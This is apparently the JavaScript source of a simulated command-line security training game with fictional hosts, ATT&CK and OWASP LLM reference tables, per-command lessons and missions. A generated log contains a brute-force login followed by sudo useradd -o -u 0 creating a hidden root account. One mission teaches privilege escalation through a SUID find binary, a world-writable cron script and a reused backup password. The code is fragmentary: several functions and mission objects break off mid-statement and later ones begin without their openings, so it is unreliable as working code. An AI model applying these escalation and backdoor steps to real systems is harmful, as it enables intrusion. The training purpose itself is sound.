<script>
/* =========================================================================
   COMMAND-LINE TRAINING
   A simulated shell over fictional filesystems and networks. Typed commands
   are parsed by the game and checked against mission objectives. Nothing
   here touches a real system. Every IP is from a documentation range and
   every organisation and threat actor is invented.
   ========================================================================= */
(function(){
"use strict";
const $=id=>document.getElementById(id);
const esc=s=>String(s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
const pad=n=>String(n).padStart(2,'0');

/* ---------- filesystem helpers ---------- */
function norm(p){ const st=[]; for(const x of p.split('/')){ if(!x||x==='.')continue; if(x==='..')st.pop(); else st.push(x);} return '/'+st.join('/'); }
function parent(p){ if(p==='/')return '/'; const i=p.lastIndexOf('/'); return i<=0?'/':p.slice(0,i); }
function base(p){ return p==='/'?'/':p.slice(p.lastIndexOf('/')+1); }
function resolve(ctx,p){ if(!p)p='.'; if(p[0]==='~')p=ctx.h.home+p.slice(1); if(p[0]!=='/')p=ctx.h.cwd+'/'+p; return norm(p); }
function node(ctx,p){ return ctx.h.fs[p]; }
function isDir(ctx,p){ return p==='/'||(ctx.h.fs[p]&&ctx.h.fs[p].t==='d'); }
function kids(ctx,dir){ return Object.keys(ctx.h.fs).filter(k=>k!==dir&&k!=='/'&&parent(k)===dir).sort(); }
const asRoot=ctx=>ctx.root||ctx.h.user==='root';
function permStr(m,d){ const t=['---','--x','-w-','-wx','r--','r-x','rw-','rwx']; m=(m||'0644'); const s=m.slice(-3).split('').map(x=>t[+x]).join('');
  let r=(d?'d':'-')+s; if(m.length===4&&m[0]==='4') r=r.slice(0,3)+(r[3]==='x'?'s':'S')+r.slice(4); return r; }
function canRead(ctx,n){ if(asRoot(ctx))return true; const m=(n.m||'0644').slice(-3); return (n.o===ctx.h.user)?(+m[0]&4)>0:(+m[2]&4)>0; }
function mkfs(spec){ const fs={'/':{t:'d',m:'0755',o:'root'}};
  for(const [p,v] of Object.entries(spec)){
    let q=parent(p); while(q!=='/'){ if(!fs[q])fs[q]={t:'d',m:'0755',o:'root'}; q=parent(q); }
    if(v===null) fs[p]=Object.assign(fs[p]||{},{t:'d',m:'0755',o:'root'});
    else if(typeof v==='string') fs[p]={t:'f',c:v,m:'0644',o:'root'};
    else if(v.t==='d') fs[p]=Object.assign({m:'0755',o:'root'},v);
    else fs[p]=Object.assign({t:'f',c:'',m:'0644',o:'root'},v);
  } return fs; }
const H=(user,host,home,spec,extra)=>Object.assign({user,host,home,cwd:home,fs:mkfs(spec)},extra||{});
function fakeHash(s){ let h=[0x811c9dc5,0x1234567,0x9e3779b9,0x85ebca6b];
  for(let i=0;i<s.length;i++){ const c=s.charCodeAt(i); for(let j=0;j<4;j++) h[j]=Math.imul(h[j]^c,16777619+j*2)>>>0; }
  let o=''; for(let k=0;k<8;k++) o+=((h[k%4]^(k*0x2f2f2f2f))>>>0).toString(16).padStart(8,'0'); return o.slice(0,64); }

/* ---------- reference data (public frameworks) ---------- */
const ATTACK={
  'T1595':{t:'Reconnaissance',n:'Active Scanning',d:'Probing the target’s hosts and services directly.'},
  'T1046':{t:'Discovery',n:'Network Service Discovery',d:'Port scanning to find what a host exposes.'},
  'T1078':{t:'Initial Access',n:'Valid Accounts',d:'Logging in with stolen or reused, but legitimate, credentials.'},
  'T1110':{t:'Credential Access',n:'Brute Force',d:'Guessing passwords repeatedly until one works.'},
  'T1133':{t:'Initial Access',n:'External Remote Services',d:'Getting in through exposed VPN, RDP or Citrix gateways.'},
  'T1190':{t:'Initial Access',n:'Exploit Public-Facing Application',d:'Abusing a bug in an internet-facing app or appliance.'},
  'T1566':{t:'Initial Access',n:'Phishing',d:'Malicious email used to get the first foothold.'},
  'T1566.001':{t:'Initial Access',n:'Spearphishing Attachment',d:'Targeted email carrying a weaponised document.'},
  'T1566.002':{t:'Initial Access',n:'Spearphishing Link',d:'Targeted email with a link to a fake login or payload.'},
  'T1059.001':{t:'Execution',n:'PowerShell',d:'Abuse of PowerShell to run commands and download payloads.'},
  'T1136':{t:'Persistence',n:'Create Account',d:'Adding a new account so access survives a password reset.'},
  'T1053.003':{t:'Persistence',n:'Cron',d:'A cron entry that keeps re-starting malicious code on Linux.'},
  'T1053.005':{t:'Persistence',n:'Scheduled Task',d:'Windows Task Scheduler used to re-launch malware.'},
  'T1548.003':{t:'Privilege Escalation',n:'Sudo and Sudo Caching',d:'Misconfigured sudo rules let a user act as root.'},
  'T1552.001':{t:'Credential Access',n:'Credentials In Files',d:'Passwords left in configs, backups and scripts.'},
  'T1083':{t:'Discovery',n:'File and Directory Discovery',d:'Browsing the filesystem for interesting files.'},
  'T1071.001':{t:'Command and Control',n:'Web Protocols',d:'C2 traffic hidden inside ordinary HTTP/HTTPS.'},
  'T1496':{t:'Impact',n:'Resource Hijacking',d:'Cryptominers burning the victim’s CPU.'},
  'T1486':{t:'Impact',n:'Data Encrypted for Impact',d:'Ransomware encrypting files to extort the victim.'},
  'T1567.002':{t:'Exfiltration',n:'Exfiltration to Cloud Storage',d:'Stolen data uploaded to services like MEGA or cloud buckets.'},
  'T1041':{t:'Exfiltration',n:'Exfiltration Over C2 Channel',d:'Stolen data sent out over the existing C2 link.'},
};
const OWASP={
  'LLM01':{n:'Prompt Injection',d:'Input (typed by a user, or hidden in a web page, file or email the model reads) that changes the model’s behaviour. "Indirect" injection arrives through content the app retrieves.'},
  'LLM02':{n:'Sensitive Information Disclosure',d:'The model reveals personal data, secrets or confidential business data in its answers.'},
  'LLM03':{n:'Supply Chain',d:'Compromised or tampered models, datasets, plugins or packages pulled from third parties.'},
  'LLM04':{n:'Data and Model Poisoning',d:'Training or fine-tuning data manipulated to plant backdoors or bias.'},
  'LLM05':{n:'Improper Output Handling',d:'Model output passed to a browser, shell or database without validation (XSS, injection).'},
  'LLM06':{n:'Excessive Agency',d:'An agent given more tools, permissions or autonomy than its job needs.'},
  'LLM07':{n:'System Prompt Leakage',d:'Secrets or sensitive rules placed in the system prompt, where users can coax them out.'},
  'LLM08':{n:'Vector and Embedding Weaknesses',d:'RAG stores that leak across tenants or accept poisoned documents.'},
  'LLM09':{n:'Misinformation',d:'Confident but false output that people or systems act on.'},
  'LLM10':{n:'Unbounded Consumption',d:'No limits on tokens, requests or cost, enabling denial-of-wallet or model theft.'},
};

/* ---------- command library ----------
   g group · s summary · man lesson · run(args, ctx, stdin) -> {o, e, h, clear} */
const R={};
function cmd(name,g,s,man,run){ R[name]={g,s,man,run}; }
const txt=(o,e)=>({o,e});
function readArg(ctx,args,stdin,name){
  const f=args.find(a=>a[0]!=='-'); if(!f) return stdin!=null?{c:stdin}:{err:`${name}: missing file`};
  const p=resolve(ctx,f), n=node(ctx,p);
  if(!n) return {err:`${name}: ${f}: No such file or directory`};
  if(n.t==='d') return {err:`${name}: ${f}: Is a directory`};
  if(!canRead(ctx,n)) return {err:`${name}: ${f}: Permission denied`};
  ctx.ev('read',p); return {c:n.c,p};
}
function flagNum(a,f,def){ const i=a.indexOf(f); if(i>=0)return {n:+a[i+1],rest:a.filter((x,j)=>j!==i&&j!==i+1)}; const m=a.find(x=>/^-\d+$/.test(x)); if(m)return {n:+m.slice(1),rest:a.filter(x=>x!==m)}; return {n:def,rest:a}; }

// ---- basics
cmd('help','basics','list the commands for this mission',
 'help — lists every command this mission understands.\nman <command> explains any of them. answer <text> answers a question objective.',
 (a,ctx)=>{ const by={}; for(const c of ctx.sc.cmds){ const r=R[c]; if(!r)continue; (by[r.g]=by[r.g]||[]).push(c); }
   let o=''; for(const g of Object.keys(by)){ o+=`<span class="hl">${g.toUpperCase()}</span>\n`; for(const c of by[g]) o+=`  <b>${c.padEnd(10)}</b> ${esc(R[c].s)}\n`; }
   return {o:o+'\n<span class="dim">man &lt;command&gt; for a full lesson · CMDS opens the reference · TASKS shows objectives</span>',h:1}; });
cmd('man','basics','explain a command','man — the manual. On a real system, man ls opens the full manual for ls. Here you get the short version plus why it matters.',
 (a)=>{ const c=a[0]; if(!c) return txt('What manual page do you want? Try: man ls',1); const r=R[c];
   if(!r) return txt(`No manual entry for ${c}`,1); return {o:`<span class="sys">MAN ${esc(c.toUpperCase())}</span>\n${esc(r.man)}`,h:1}; });
cmd('answer','basics','answer a question objective','answer — submit your answer to the current question objective.\n  answer 203.0.113.9\nQuestions test that you understood what you found, the same way a lead checks a junior’s work.',
 (a,ctx)=>{ const v=a.join(' ').trim().toLowerCase().replace(/^["']|["']$/g,''); const sc=ctx.sc;
   const i=sc.obj.findIndex((o,j)=>o.ans&&!ctx.done.has(j)); if(i<0) return txt('No open questions right now.');
   if(!v) return txt(`Question: ${sc.obj[i].t}\nusage: answer <your answer>`);
   const o=sc.obj[i]; const ok=o.ans.some(x=>{ x=x.toLowerCase(); return x.length<=3?v===x:v.includes(x); });
   if(ok){ ctx.ans.add(i); return {o:`<span class="ok">Correct.</span>${o.why?' '+esc(o.why):''}`,h:1}; }
   ctx.wrong=(ctx.wrong||0)+1; return {o:`<span class="err">Not quite.</span> Question: ${esc(o.t)}\n<span class="dim">Hint: ${esc(o.h)}</span>`,h:1}; });
cmd('clear','basics','wipe the screen','clear — clears the terminal. Ctrl+L does the same on most shells.',()=>({clear:1}));
cmd('echo','basics','print text','echo — prints its arguments. Handy for testing pipes: echo hello | grep ell',a=>txt(a.join(' ')));
cmd('pwd','basics','show where you are','pwd — print working directory: the full path of the folder you are in.',(a,ctx)=>txt(ctx.h.cwd));
cmd('whoami','basics','show your user','whoami — the user you are running as. The first question after you land on any box.',(a,ctx)=>txt(asRoot(ctx)?'root':ctx.h.user));
cmd('id','basics','show user + groups','id — your uid, gid and groups. uid=0 is root. Groups like sudo, adm, docker or lxd hint at extra privileges.',
 (a,ctx)=>{ const u=asRoot(ctx)?'root':ctx.h.user; return txt(u==='root'?'uid=0(root) gid=0(root) groups=0(root)':`uid=1001(${u}) gid=1001(${u}) groups=1001(${u})${ctx.h.groups?','+ctx.h.groups:''}`); });
cmd('hostname','basics','show machine name','hostname — the name of the machine you are on. Useful once you hop between boxes.',(a,ctx)=>txt(ctx.h.host));
cmd('ls','basics','list files','ls — list a directory.\n  -l  long format: permissions, owner, size\n  -a  include hidden files (names starting with .)\nBoth attackers and defenders start with ls -la.',
 (a,ctx)=>{ const fl=a.filter(x=>x[0]==='-').join(''); const tgt=a.find(x=>x[0]!=='-'); const p=resolve(ctx,tgt);
   const n=node(ctx,p); if(p!=='/'&&!n) return txt(`ls: cannot access '${tgt}': No such file or directory`,1);
   const row=(k,m)=>`${permStr(m.m,m.t==='d')} 1 ${m.o.padEnd(9)} ${String(m.t==='d'?4096:(m.c||'').length).padStart(5)} Nov 14 ${m.t==='d'?`<span class="hl">${esc(base(k))}/</span>`:esc(base(k))}`;
   if(n&&n.t==='f') return fl.includes('l')?{o:row(p,n),h:1}:txt(base(p));
   if(!asRoot(ctx)&&n&&n.o!==ctx.h.user&&n.m==='0700') return txt(`ls: cannot open directory '${tgt}': Permission denied`,1);
   let ks=kids(ctx,p); if(!fl.includes('a')) ks=ks.filter(k=>!base(k).startsWith('.'));
   if(!ks.length) return txt('');
   if(fl.includes('l')) return {o:ks.map(k=>row(k,ctx.h.fs[k])).join('\n'),h:1};
   return {o:ks.map(k=>ctx.h.fs[k].t==='d'?`<span class="hl">${esc(base(k))}/</span>`:esc(base(k))).join('  '),h:1}; });
cmd('cd','basics','change folder','cd — change directory.\n  cd /etc   absolute path\n  cd ..     up one level\n  cd ~      your home folder',
 (a,ctx)=>{ const p=resolve(ctx,a[0]||'~'); if(!isDir(ctx,p)) return txt(`cd: ${a[0]}: No such directory`,1);
   const n=node(ctx,p); if(!asRoot(ctx)&&n&&n.o!==ctx.h.user&&n.m==='0700') return txt(`cd: ${a[0]}: Permission denied`,1);
   ctx.h.cwd=p; return {}; });
cmd('cat','basics','print a file','cat — prints a file’s contents. The workhorse for reading configs, logs and notes.\n  cat /etc/passwd   every account on the system',
 (a,ctx,si)=>{ const r=readArg(ctx,a,si,'cat'); return r.err?txt(r.err,1):txt(r.c); });
cmd('head','basics','first lines','head — first lines of a file or piped input.\n  head -n 5 file',(a,ctx,si)=>{ const {n,rest}=flagNum(a,'-n',10); const r=readArg(ctx,rest,si,'head'); return r.err?txt(r.err,1):txt(r.c.split('\n').slice(0,n).join('\n')); });
cmd('tail','basics','last lines','tail — last lines of a file. Defenders live in it: tail -n 20 /var/log/auth.log',
 (a,ctx,si)=>{ const {n,rest}=flagNum(a,'-n',10); const r=readArg(ctx,rest,si,'tail'); return r.err?txt(r.err,1):txt(r.c.split('\n').slice(-n).join('\n')); });
cmd('grep','basics','search text','grep — find lines matching a pattern.\n  grep "Failed password" /var/log/auth.log\n  -i ignore case · -v invert · -r search a folder · -c count matches · -E regex\nPipe into it: cat file | grep word',
 (a,ctx,si)=>{ const fl=a.filter(x=>/^-[a-zA-Z]+$/.test(x)).join(''); const pos=a.filter(x=>!/^-[a-zA-Z]+$/.test(x)); const pat=pos[0]; if(pat==null) return txt('usage: grep [-i] PATTERN [FILE]',1);
   let re; try{ re=new RegExp(fl.includes('E')?pat:pat.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),fl.includes('i')?'i':''); }catch(e){ return txt('grep: invalid pattern',1); }
   const keep=l=>re.test(l)!==fl.includes('v'); ctx.ev('grep',pat);
   if(fl.includes('r')){ const root=resolve(ctx,pos[1]||'.'); const hits=[];
     for(const k of Object.keys(ctx.h.fs).sort()) if((k===root||k.startsWith(root==='/'?'/':root+'/'))&&ctx.h.fs[k].t==='f'&&canRead(ctx,ctx.h.fs[k]))
       for(const l of ctx.h.fs[k].c.split('\n')) if(keep(l)){ hits.push(`<span class="hl">${esc(k)}</span>:${esc(l)}`); ctx.ev('grephit',k); }
     return {o:hits.join('\n'),h:1}; }
   const r=readArg(ctx,pos.slice(1),si,'grep'); if(r.err) return txt(r.err,1);
   const ls=r.c.split('\n').filter(keep); return txt(fl.includes('c')?String(ls.length):ls.join('\n')); });
cmd('wc','basics','count lines','wc -l — count lines. grep ERROR app.log | wc -l counts the errors.',(a,ctx,si)=>{ const r=readArg(ctx,a,si,'wc'); return r.err?txt(r.err,1):txt(String(r.c.split('\n').filter(Boolean).length)); });
cmd('sort','basics','sort lines','sort — sort lines.\n  -n numeric · -r reverse\nThe classic "top talkers" pipeline: ... | sort | uniq -c | sort -nr',
 (a,ctx,si)=>{ const fl=a.filter(x=>x[0]==='-').join(''); const r=readArg(ctx,a.filter(x=>x[0]!=='-'),si,'sort'); if(r.err) return txt(r.err,1);
   let ls=r.c.split('\n').filter(x=>x!==''); ls=fl.includes('n')?ls.sort((x,y)=>parseFloat(x)-parseFloat(y)):ls.sort(); if(fl.includes('r')) ls.reverse(); return txt(ls.join('\n')); });
cmd('uniq','basics','collapse repeats','uniq -c — collapse repeated lines and count them. Sort first, because uniq only merges neighbours.',
 (a,ctx,si)=>{ const r=readArg(ctx,a.filter(x=>x[0]!=='-'),si,'uniq'); if(r.err) return txt(r.err,1); const o=[]; let prev=null,c=0;
  for(const l of r.c.split('\n').filter(x=>x!=='').concat([null])){ if(l===prev){c++;continue;} if(prev!==null) o.push(a.includes('-c')?`${String(c).padStart(4)} ${prev}`:prev); prev=l;c=1; } return txt(o.join('\n')); });
cmd('cut','basics','pick columns','cut — keep certain fields of each line.\n  cut -d: -f1 /etc/passwd       usernames\n  cut -d" " -f1 access.log       first column',
 (a,ctx,si)=>{ let d='\t',f=1; const rest=[]; for(let i=0;i<a.length;i++){ const x=a[i]; if(x.startsWith('-d')){ d=x.length>2?x.slice(2):a[++i]; } else if(x.startsWith('-f')){ f=+(x.length>2?x.slice(2):a[++i]); } else rest.push(x); }
   const r=readArg(ctx,rest,si,'cut'); if(r.err) return txt(r.err,1); return txt(r.c.split('\n').map(l=>l.split(d)[f-1]||'').join('\n')); });
cmd('awk','basics','print fields','awk — a small language for column data. The most common use:\n  awk \'{print $1}\' access.log        first column (space-separated)\n  awk -F: \'{print $1,$3}\' /etc/passwd  user and uid\n  awk -F: \'$3==0\' /etc/passwd         lines where uid is 0',
 (a,ctx,si)=>{ let sep=null; const rest=[]; let prog=null;
   for(let i=0;i<a.length;i++){ const x=a[i]; if(x.startsWith('-F')){ sep=x.length>2?x.slice(2):a[++i]; } else if(prog===null&&/[{$]/.test(x)) prog=x; else rest.push(x); }
   if(!prog) return txt("usage: awk '{print $1}' FILE",1);
   const r=readArg(ctx,rest,si,'awk'); if(r.err) return txt(r.err,1);
   const split=l=>sep?l.split(sep):l.trim().split(/\s+/);
   const cond=prog.match(/^\s*\$(\d+)\s*(==|!=)\s*"?([^"{]*?)"?\s*(\{.*\})?\s*$/); const pr=prog.match(/print\s+([^}]*)/);
   const out=[]; for(const l of r.c.split('\n')){ if(!l)continue; const F=split(l);
     if(cond){ const v=F[+cond[1]-1]||''; if((v===cond[3].trim())!==(cond[2]==='==')) continue; if(!cond[4]){ out.push(l); continue; } }
     if(pr){ out.push(pr[1].split(',').map(t=>{ t=t.trim(); const m=t.match(/^\$(\d+)$/); return m?(+m[1]===0?l:(F[+m[1]-1]||'')):t.replace(/"/g,''); }).join(' ')); } }
   return txt(out.join('\n')); });
cmd('sed','harden','edit text in place','sed — stream editor.\n  sed \'s/old/new/\' file          print with the first match replaced\n  sed -i \'s/old/new/\' file       edit the file in place\n  sed -i \'/pattern/d\' file        delete matching lines\nAdmins use sed -i to change config files from scripts.',
 (a,ctx,si)=>{ const inplace=a.includes('-i'); const rest=a.filter(x=>x!=='-i'); const ex=rest[0]; if(!ex) return txt("usage: sed [-i] 's/old/new/' FILE",1);
   const f=rest[1]; let r; if(f){ const p=resolve(ctx,f), n=node(ctx,p); if(!n) return txt(`sed: can't read ${f}: No such file or directory`,1); if(inplace&&!asRoot(ctx)&&n.o!==ctx.h.user&&!(+(n.m||'0644').slice(-1)&2)) return txt(`sed: couldn't open ${f}: Permission denied`,1); r={c:n.c,p,n}; }
   else { if(si==null) return txt('sed: no input',1); r={c:si}; }
   let out; const s=ex.match(/^s(.)(.*?)\1(.*?)\1(g?)$/), d=ex.match(/^\/(.*)\/d$/);
   if(s){ const re=new RegExp(s[2].replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),s[4]?'g':''); out=r.c.split('\n').map(l=>l.replace(re,s[3])).join('\n'); }
   else if(d){ out=r.c.split('\n').filter(l=>!l.includes(d[1])).join('\n'); }
   else return txt(`sed: unsupported expression '${ex}' (try s/old/new/ or /pattern/d)`,1);
   if(inplace&&r.n){ r.n.c=out; ctx.ev('sed',r.p); return {}; } return txt(out); });
cmd('find','basics','search the filesystem','find — search by name, type, owner or permission.\n  find / -name "*.conf"\n  find / -user ops            files owned by ops\n  find / -perm -4000          SUID files (run as their owner)\n  find / -perm -o+w -type f   world-writable files\n  find / -type f',
 (a,ctx)=>{ const start=resolve(ctx,a[0]&&a[0][0]!=='-'?a[0]:'.'); const arg=f=>{ const i=a.indexOf(f); return i>=0?(a[i+1]||'').replace(/^["']|["']$/g,''):null; };
   const name=arg('-name'), perm=arg('-perm'), type=arg('-type'), user=arg('-user');
   const re=name?new RegExp('^'+name.replace(/[.+^${}()|[\]\\]/g,'\\$&').replace(/\*/g,'.*').replace(/\?/g,'.')+'$'):null;
   const out=[]; for(const k of Object.keys(ctx.h.fs).sort()){ if(!(k===start||k.startsWith(start==='/'?'/':start+'/')))continue; const n=ctx.h.fs[k];
     if(type==='f'&&n.t!=='f')continue; if(type==='d'&&n.t!=='d')continue; if(re&&!re.test(base(k)))continue; if(user&&n.o!==user)continue;
     if(perm&&/4000|u=s/.test(perm)&&!(n.m&&n.m.length===4&&n.m[0]==='4'))continue;

cmd('nmap','recon','scan hosts and ports','nmap — the network mapper.\n  nmap 10.10.20.0/24 --exclude 10.10.20.30   find live hosts, skipping an out-of-scope IP\n  nmap 10.10.20.10                            common open ports\n  nmap -sV 10.10.20.10                        also identify service versions\nATT&CK T1046. Scanning anything outside your written scope is illegal in most countries and ends careers.',
 (a,ctx)=>{ const ex=[]; const pos=[]; for(let i=0;i<a.length;i++){ if(a[i]==='--exclude'){ ex.push(...(a[++i]||'').split(',')); } else if(a[i][0]!=='-') pos.push(a[i]); }

   for(const [p,s] of Object.entries(t.ports)) o+=`<span class="ok">${(p+'/tcp').padEnd(10)}open</span>  ${s[0].padEnd(9)}${v?' '+esc(s[1]):''}\n`;

cmd('curl','recon','fetch a web page','curl — make an HTTP request and print the response.\n  curl http://10.10.10.5/\n  curl -I http://10.10.10.5/   headers only (the Server header leaks the software version)\nrobots.txt tells search engines what NOT to index, which often points at interesting paths.',

cmd('su','access','switch user','su — switch to another user (su root, or su - for a login shell). It asks for THAT user’s password.\nIf root reuses a password you found elsewhere, su is all it takes. That is why password reuse is rated high severity.',

cmd('sudo','access','run a command as root','sudo — run one command as root.\n  sudo -l   list what YOU may run as root\nA loose sudo rule is a classic privilege-escalation path (ATT&CK T1548.003). Defenders: audit /etc/sudoers and /etc/sudoers.d/.',

cmd('chmod','harden','change permissions','chmod — who can read (4), write (2), execute (1). Three digits: owner, group, everyone.\n  chmod 644 file   owner rw, others read\n  chmod 600 file   owner only\n  chmod u+r file   add read for the owner\n  chmod o-w file   remove write for everyone else',

cmd('ufw','harden','simple firewall','ufw — Uncomplicated Firewall.\n  ufw status\n  ufw default deny incoming   block everything inbound...\n  ufw allow 22                ...except what you need\n  ufw deny from 192.0.2.66    block one attacker IP\n  ufw enable',

   ctx.ev('modelscan',f); return {o:n.scan||'<span class="ok">No issues found.</span>',h:1}; });
cmd('evalrun','ai','run the AI security test suite','evalrun — runs the app’s security evaluation suite (like promptfoo, garak or PyRIT in real teams): hundreds of adversarial test cases per category, scored pass/fail.\nRun it before every release, and after every guardrail change.',
 (a,ctx)=>{ const r=ctx.sc.evalrun(ctx); ctx.ev('evalrun',r.pass); return {o:r.o,h:1}; });

cmd('exiftool','ci','read a file’s hidden metadata','exiftool — reads metadata hidden inside documents and images: author, software, internal file paths, GPS, edit history.\nAdversaries harvest it from public PDFs to learn usernames, server names and software versions. Strip it before publishing.',
 (a,ctx)=>{ const f=a.find(x=>x[0]!=='-'); if(!f) return txt('usage: exiftool FILE',1); const n=node(ctx,resolve(ctx,f)); if(!n) return txt(`Error: File not found - ${f}`,1);
   ctx.ev('exif',f); return txt(n.meta?Object.entries(n.meta).map(([k,v])=>`${k.padEnd(28)}: ${v}`).join('\n'):'File Type                   : TXT\n(no embedded metadata)'); });
cmd('canary','ci','deploy and monitor honeytokens','canary — honeytokens: fake credentials, documents and accounts that nobody legitimate should ever touch. Any use is a high-confidence alert (ideas popularised by Thinkst Canary).\n  canary types\n  canary deploy <type> <location>\n  canary list\n  canary alerts',
 (a,ctx)=>{ const C=ctx.sc.canary, st=ctx.st; st.tokens=st.tokens||[]; const [sub,type,...loc]=a;
   if(sub==='types') return txt(Object.entries(C.types).map(([k,v])=>`${k.padEnd(9)} ${v}`).join('\n'));
   if(sub==='deploy'){ if(!C.types[type]) return txt(`Unknown type. canary types`,1); if(!loc.length) return txt('usage: canary deploy <type> <location>',1);
     if(st.tokens.some(t=>t.type===type)) return txt(`A ${type} token is already deployed.`,1);
     st.tokens.push({type,loc:loc.join(' ')}); ctx.ev('canary',type); return txt(`Deployed ${type} token at ${loc.join(' ')}. Alerts go to the SOC.`); }
   if(sub==='list') return txt(st.tokens.length?st.tokens.map(t=>`${t.type.padEnd(9)} ${t.loc}`).join('\n'):'No tokens deployed.');
   if(sub==='alerts'){ ctx.ev('canaryAlerts'); if(st.tokens.length<3) return txt('No alerts. (Deploy at least one of each token type, then check back.)');
     return {o:'<span class="dim">… 26 hours later …</span>\n'+C.alerts(st.tokens),h:1}; }
   return txt('usage: canary types | deploy <type> <location> | list | alerts',1); });

 (a,ctx)=>{ const d=a[0]; if(!d) return txt('usage: twist <domain>',1); const r=ctx.sc.twist[d]; ctx.ev('twist',d);
   return r?{o:r,h:1}:txt(`No registered lookalikes found for ${d}.`); });

function authLog(){
  const L=['Nov 14 02:55:10 web-prod-01 sshd[1102]: Accepted publickey for deploy from 10.0.0.12 port 50122 ssh2',
           'Nov 14 02:58:41 web-prod-01 CRON[1150]: pam_unix(cron:session): session opened for user root'];
  const users=['root','admin','test','oracle','ubuntu']; let t=3*3600+60;
  const ts=s=>`Nov 14 ${pad(Math.floor(s/3600))}:${pad(Math.floor(s%3600/60))}:${pad(s%60)}`;
  for(let i=0;i<27;i++){ L.push(`${ts(t)} web-prod-01 sshd[${1200+i}]: Failed password for ${users[i%5]} from 203.0.113.9 port ${51000+i*3} ssh2`); t+=19;
    if(i===8||i===16||i===22) L.push(`${ts(t+3)} web-prod-01 sshd[${1300+i}]: Failed password for root from 198.51.100.5 port 40${i} ssh2`); }
  L.push(`${ts(t)} web-prod-01 sshd[1290]: Failed password for svc-backup from 203.0.113.9 port 51990 ssh2`);
  L.push(`Nov 14 03:14:22 web-prod-01 sshd[1291]: Accepted password for svc-backup from 203.0.113.9 port 51994 ssh2`);
  L.push(`Nov 14 03:15:40 web-prod-01 sudo: svc-backup : TTY=pts/1 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 -g 0 -M sysmaint`);
  L.push(`Nov 14 03:16:02 web-prod-01 sudo: svc-backup : TTY=pts/1 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/usr/bin/passwd sysmaint`);
  L.push(`Nov 14 03:21:15 web-prod-01 sshd[1340]: Accepted publickey for deploy from 10.0.0.12 port 50311 ssh2`);
  return L.join('\n');
}

{ id:'r1', track:'red', title:'Shell Fundamentals',

  skills:['ls -la','cat','find -user','grep','chmod','wc'],
  lesson:`<p>Every engagement and every investigation happens in a shell. Before you touch a target, you need to move around fast.</p>

<li><b>Permissions</b> read as owner/group/everyone: <code>-rw-r-----</code> means the owner can read and write, the group can read, everyone else gets nothing.</li>
<li><b>find</b> searches by property (owner, name, permission); <b>grep</b> searches inside files.</li><li><b>Pipes</b> chain tools: <code>grep ERROR app.log | wc -l</code>.</li></ul>`,
  brief:'Training box. Five passwords are hidden around your home folder. Each objective is a question: find the answer, then submit it with <b>answer &lt;text&gt;</b>.',
  cmds:[...BASIC,'chmod'], chips:['ls -la','cat readme','ls -l inhere','grep millionth data.txt','answer '],
  make(){ const words=[]; for(let i=0;i<300;i++) words.push(['alpha','bravo','charlie','delta','echo','foxtrot'][i%6]+' '+fakeHash('w'+i).slice(0,10)); words[211]='millionth quiet-harbor-90';
    const app=[]; for(let i=0;i<40;i++) app.push(`2026-11-14 0${i%9}:${pad(i)}:00 ${[3,11,17,22,28,31,36].includes(i)?'ERROR db timeout':'INFO request ok'}`);
    const h=H('cadet','training','/home/cadet',{
      '/home/cadet/readme':'Welcome, cadet.\n1. The first password is in a hidden file in this folder.\n2. One file in inhere/ is owned by the user "ops". Its contents are the second password.\n3. The third password sits next to the word "millionth" in data.txt.\n4. locked.txt is yours, but nobody can read it. Fix that.\n5. How many ERROR lines are in app.log?',
      '/home/cadet/.secret':{c:'blue-falcon-17',o:'cadet'},

    {t:'Password 1: in a hidden file in your home folder', ans:['blue-falcon-17'], h:'ls -la shows dot-files. Then cat the one that looks like a secret.'},
    {t:'Password 2: the file in inhere/ owned by "ops"', ans:['amber-delta-55'], h:'ls -l inhere shows owners. Or: find inhere -user ops'},
    {t:'Password 3: next to the word "millionth" in data.txt', ans:['quiet-harbor-90'], h:'grep millionth data.txt'},

  debrief:'<p>These are the moves you make dozens of times an hour on real boxes. Two habits worth keeping:</p><ul><li>Run <code>ls -la</code> in every new folder. Backups, <code>.env</code> files, SSH keys and shell history all hide as dot-files.</li><li>Learn to answer questions with pipelines (<code>grep | sort | uniq -c</code>) rather than reading whole files. Logs on real systems run to millions of lines.</li></ul>' },

  debrief:'<p>Professional recon is methodical and documented. Note every command, timestamp and result. The client may ask what you scanned and when.</p><ul><li>The scanner blocked you here. Real tools won’t. <code>--exclude</code> (or an exclude file) is the habit that protects you.</li><li>"Old version" leads still need confirming. Many Linux distros backport security fixes without changing the version string.</li><li>Printers, cameras and other appliances with default passwords show up in real reports all the time.</li></ul>' },

      '/etc/crontab':'SHELL=/bin/sh\n# m h dom mon dow user  command\n17 *  * * *  root  run-parts /etc/cron.hourly\n*/5 * * * *  root  /opt/scripts/cleanup.sh',
      '/opt/scripts/cleanup.sh':{c:'#!/bin/sh\n# clears old uploads\nfind /var/www/uploads -mtime +7 -delete',m:'0777'},
      '/var/backups/app.conf.bak':'# app config backup 2026-09-01\ndb_host=localhost\ndb_user=root\ndb_password=Winter-Quarry-61\n# NOTE: same as the root login, change both!',
      '/root':{t:'d',m:'0700'}, '/root/proof.txt':{c:'PROOF: root on app-stage-02 via a reused password found in /var/backups/app.conf.bak',m:'0600'},
    },{su:{root:'rootpw'}}); h.fs['/home/webdev'].o='webdev'; return {hosts:{me:h},h,net:{},st:{}}; },
  truth:{finding:['password','reuse','credential'],severity:['high','critical'],evidence:['app.conf.bak','backup'],fix:['rotate','unique','remove','delete']},
  reportHint:'finding = what is wrong, severity = High/Critical, evidence = the file, fix = what the client must do.',
  obj:[
    {t:'Which SUID binary should NOT have the SUID bit? (name)', ans:['find'], h:'find / -perm -4000. passwd, sudo and mount need it. A general file-search tool running as root can be abused to run commands.'},
    {t:'Which script, run by root from cron, can anyone edit? (path)', ans:['/opt/scripts/cleanup.sh','cleanup.sh'], h:'cat /etc/crontab, then ls -l the script it runs. rwxrwxrwx = world-writable.'},
    {t:'Find a password left in a backup file', h:'ls -la /var/backups, then cat what you find.', ok:c=>c.st.rootpw},
    {t:'Prove impact: become root and read /root/proof.txt', h:'The backup says the password is reused. su root, then cat /root/proof.txt', ok:c=>c.seen.proof},
